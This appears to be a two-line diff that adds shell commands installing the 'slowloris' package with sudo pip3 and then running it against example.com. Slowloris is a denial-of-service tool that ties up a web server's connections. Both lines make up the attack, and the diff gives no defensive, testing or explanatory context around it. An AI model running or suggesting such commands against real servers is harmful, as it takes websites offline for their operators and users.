@@ -1,0 +1,2 @@
+sudo pip3 install slowloris
+slowloris example.com
